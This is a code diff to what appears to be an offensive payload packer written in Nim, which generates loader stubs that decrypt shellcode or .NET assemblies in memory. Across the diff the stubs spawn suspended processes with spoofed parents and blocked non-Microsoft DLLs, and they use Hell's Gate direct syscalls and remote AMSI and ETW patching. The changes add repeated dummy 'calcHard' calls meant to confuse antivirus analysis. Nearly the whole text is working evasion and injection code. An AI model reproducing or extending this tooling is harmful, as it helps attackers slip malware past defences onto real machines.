@@ -631,8 +631,8 @@ else:
         var newPath = packerPath & "/pwnPowershell/RunSpace.exe"
         blob = readFile(newPath)
 
-if (AMSICreateSectionHook):
-    echo "Not fully working yet, sorry!"
+#if (AMSICreateSectionHook):
+#    echo "Not fully working yet, sorry!"
     quit(0)
 
 #Read file and if PE convert to shellcode before
@@ -827,20 +827,20 @@ let PatchargsFuncs = fmt"""
 """
 
 
-let RemoteProcImportStub = """
-import osproc
-"""
+
 
 
 let LoadAssemblyStub = fmt"""
+
+
 
     # Actually decrypt after doing everything else for better evasion.
     ptrEncText = cast[ptr byte](addr enctext[0])
     ptrDecText = cast[ptr byte](addr dectext[0])
     decryptlate()
-
+    discard calcHard()
     var assembly = load(dectext)
-
+    discard calcHard()
 
     when defined(lib_only):
         # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
@@ -867,9 +867,11 @@ let LoadAssemblyStub = fmt"""
 
     var cmd: seq[string]
     var i = 1
+    discard calcHard()
     when defined(args):
         cmd.add({arguments.split(" ")})
     while i <= paramCount():
+        discard calcHard()
         when defined(lib_only):
             if (i != 1):
                 # first parameter is rundll32.exe,Funcname (skip that)
@@ -881,14 +883,18 @@ let LoadAssemblyStub = fmt"""
 
 let LoadAssemblyStubArgs = """
     var arr = toCLRVariant(cmd, VT_BSTR)
+    discard calcHard()
     assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+    discard calcHard()
 
 when not defined(lib_only):
     discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
+    discard calcHard()
     var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
+    discard calcHard()
     assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
 
 when not defined(lib_only):
@@ -964,6 +970,10 @@ import winim/clr
 from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 from os import paramCount,paramStr
 
+# when defined Sleep
+import random
+import times
+
 # when defined Hellsgate
 from os import paramStr
 {.passC:"-masm=intel".}
@@ -1021,7 +1031,13 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-
+proc calcHard *(): int =
+    var rand: int = 0
+    for i in 0 .. 10:
+        rand += 15
+        if ((rand mod 9) != 0):
+            rand += 15
+    return rand
 
 """
 
@@ -1032,13 +1048,16 @@ let Cryptstub2 = fmt"""
         var sleepbetweentime: int = {sleepinbetween}
 
     var enctext: seq[byte] = toByteSeq(encstring)
+    discard calcHard()
     var key: array[aes256.sizeKey, byte]
+    discard calcHard()
     var envkey: string = obf("{envkey}")
 """
 
 let Cryptstub3 = fmt"""
     
     var expandedkey = toByteSeq(envkey)
+    discard calcHard()
     if ((len(expandedkey) mod aes256.sizeBlock) != 0):
         when defined(verbose):
             echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
@@ -1049,6 +1068,7 @@ let Cryptstub3 = fmt"""
             echo "[*] New Length: " & $len(expandedkey)
 
     copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
+    discard calcHard()
     var dectext = newSeq[byte](len(enctext))
 
     var ptrKey = cast[ptr byte](addr key[0])
@@ -1065,6 +1085,7 @@ let Cryptstub3 = fmt"""
         when defined(verbose):
             echo obf("[!] Decrypting Shellcode for execution in memory")
         dctx.init(ptrKey)
+        discard calcHard()
         dctx.decrypt(ptrEncText, ptrDecText, dataLen)
         dctx.clear()
 
@@ -1350,118 +1371,118 @@ SleepyCryptLoop(10000)
 let NotepadProcIDStub * = fmt"""
 
 
-proc FindPidByName * (processName : string):DWORD =
-    try:
+    proc FindPidByName (processName : string):DWORD =
+        try:
+            var 
+                entry : PROCESSENTRY32A
+                snapshot : HANDLE
+                pid : DWORD = 0
+            snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+            if snapshot != INVALID_HANDLE_VALUE:
+                entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
+                if Process32FirstA(snapshot,addr entry):
+                    while Process32NextA(snapshot,addr entry):
+                        pid = entry.th32ProcessID
+                        if ($(entry.szExeFile).join()).contains(processName):
+                            result = pid
+        except: 
+            echo obf("Process ID not found")
+
+    var remoteProcID: DWORD
+
+    proc StartProcess(): void =
         var 
-            entry : PROCESSENTRY32A
-            snapshot : HANDLE
-            pid : DWORD = 0
-        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-        if snapshot != INVALID_HANDLE_VALUE:
-            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
-            if Process32FirstA(snapshot,addr entry):
-                while Process32NextA(snapshot,addr entry):
-                    pid = entry.th32ProcessID
-                    if ($(entry.szExeFile).join()).contains(processName):
-                        result = pid
-    except: 
-        echo obf("Process ID not found")
-
-var remoteProcID: DWORD
-
-proc StartProcess(): void =
-    var 
-        lpSize: SIZE_T
-        tProcess: HANDLE
-        pi: PROCESS_INFORMATION
-        ps: SECURITY_ATTRIBUTES
-        si: STARTUPINFOEX
-        status: WINBOOL
-        tHandle: HANDLE
-        tProcPath: WideCString
-        ts: SECURITY_ATTRIBUTES
-    
-    ps.nLength = sizeof(ps).cint
-    ts.nLength = sizeof(ts).cint
-    si.StartupInfo.cb = sizeof(si).cint
+            lpSize: SIZE_T
+            tProcess: HANDLE
+            pi: PROCESS_INFORMATION
+            ps: SECURITY_ATTRIBUTES
+            si: STARTUPINFOEX
+            status: WINBOOL
+            tHandle: HANDLE
+            tProcPath: WideCString
+            ts: SECURITY_ATTRIBUTES
+        
+        ps.nLength = sizeof(ps).cint
+        ts.nLength = sizeof(ts).cint
+        si.StartupInfo.cb = sizeof(si).cint
 
 
-    when defined spoof_args:
-        tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")) & " " & obf("{spoofArgs}"))
-    else:
-        tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")))
+        when defined spoof_args:
+            tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")) & " " & obf("{spoofArgs}"))
+        else:
+            tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")))
 
-    when defined(blockDLLs) or (obf("{parentProcess}") != ""):
-        InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
-        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
-        InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+        when defined(blockDLLs) or (obf("{parentProcess}") != ""):
+            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
 
-        when defined(blockDLLs):
-            const
-                PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
-            var
-                policy: DWORD64
+            when defined(blockDLLs):
+                const
+                    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
+                var
+                    policy: DWORD64
 
-            policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
-            
-            status = UpdateProcThreadAttribute(
-                si.lpAttributeList,
-                0,
-                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
-                addr policy,
-                sizeof(policy),
-                NULL,
-                NULL)
+                policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+                
+                status = UpdateProcThreadAttribute(
+                    si.lpAttributeList,
+                    0,
+                    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+                    addr policy,
+                    sizeof(policy),
+                    NULL,
+                    NULL)
 
-        if (obf("{parentProcess}") != ""):
-            var
-                ppHandle: HANDLE
-                ppid: DWORD
+            if (obf("{parentProcess}") != ""):
+                var
+                    ppHandle: HANDLE
+                    ppid: DWORD
 
-            ppid = FindPidByName(obf("{parentProcess}"))                    
-            ppHandle = OpenProcess(PROCESS_ALL_ACCESS,false, ppid)
-            
-            if (ppHandle == 0):
-              when defined(verbose):
-                echo obf("Failed to open parent process handle, no permissions??")
-              ppHandle = HANDLE(-1) # Current Process
+                ppid = FindPidByName(obf("{parentProcess}"))                    
+                ppHandle = OpenProcess(PROCESS_ALL_ACCESS,false, ppid)
+                
+                if (ppHandle == 0):
+                    when defined(verbose):
+                        echo obf("Failed to open parent process handle, no permissions??")
+                    ppHandle = HANDLE(-1) # Current Process
 
-            status = UpdateProcThreadAttribute(
-                si.lpAttributeList,
-                0,
-                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
-                addr ppHandle,
-                sizeof(ppHandle),
-                NULL,
-                NULL)
+                status = UpdateProcThreadAttribute(
+                    si.lpAttributeList,
+                    0,
+                    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+                    addr ppHandle,
+                    sizeof(ppHandle),
+                    NULL,
+                    NULL)
 
-    status = CreateProcess(
-        NULL,
-        cast[LPWSTR](tProcPath),
-        ps,
-        ts, 
-        FALSE,
-        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
-        NULL,
-        r"C:\Windows\system32\",
-        addr si.StartupInfo,
-        addr pi)
+        status = CreateProcess(
+            NULL,
+            cast[LPWSTR](tProcPath),
+            ps,
+            ts, 
+            FALSE,
+            EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
+            NULL,
+            r"C:\Windows\system32\",
+            addr si.StartupInfo,
+            addr pi)
 
-    tProcess = pi.hProcess
-    remoteProcID = pi.dwProcessId
-    tHandle = pi.hThread
+        tProcess = pi.hProcess
+        remoteProcID = pi.dwProcessId
+        tHandle = pi.hThread
 
-StartProcess()
+    StartProcess()
 
 
-when defined(verbose):
-    echo obf("[*] Sleeping in between for: "), {sleepinbetween}
+    when defined(verbose):
+        echo obf("[*] Sleeping in between for: "), {sleepinbetween}
 
-when defined(sleepinbetween):
-    HowMuchTimeWouldYouLikeToSleep({sleepinbetween})
+    when defined(sleepinbetween):
+        HowMuchTimeWouldYouLikeToSleep({sleepinbetween})
 
-when defined(verbose):
-    echo obf("[*] Target Process: "), remoteProcID
+    when defined(verbose):
+        echo obf("[*] Target Process: "), remoteProcID
 
 
 """
@@ -1522,9 +1543,11 @@ if(sandbox):
 if (apihide):
     stub.add(APIHideStub)
 
-if(gosleep):
+
+if(gosleep or remoteETWpatch or remoteAMSIpatch):
     stub.add(SleepStubFirst)
-    stub.add(SleepStubSecond)
+    if (gosleep):
+        stub.add(SleepStubSecond)
 
 stub.add(getRandStubNoTab())
 
@@ -1552,10 +1575,11 @@ if(hellsgate):
     stub.add(HellsgateNtCloseDelegate)
     if (peload and (not localinject)):
         stub.add(HellsgateNtCreateThreadExDelegate)
-    elif(localCreateThread):
+    elif(localCreateThread or remoteETWpatch or remoteAMSIpatch):
         stub.add(HellsgateNtCreateThreadExDelegate)
-    elif(not localinject):
+    if(not localinject or remoteETWpatch or remoteAMSIpatch):
         stub.add(HellsgateNtOpenProcessDelegate)
+        stub.add(HellsgateNtCreateThreadExDelegate)
 
 if (AMSICreateSectionHook):
     stub.add(AMSINtCreateSectionHookStubFirst)
@@ -1619,8 +1643,6 @@ if (localinject):
 stub.add(getRandStub())
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
-    if (gosleep == false):
-        stub.add(SleepStubFirst)
     if (unhook == false):
         if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
 stub.add(getRandStub())
@@ -1638,7 +1660,6 @@ if (peload):
             stub.add(PELoadStub)
         stub.add(getRandStub())
     else:   
-        stub.add(RemoteProcImportStub)
         if (hellsgate):
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
@@ -1678,8 +1699,6 @@ if (shellcode):
         stub.add(getRandStub())
     else:
         stub.add(getRandStub())
-        if (getfreshstub):
-            stub.add(RemoteProcImportStub)
         if (hellsgate):
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
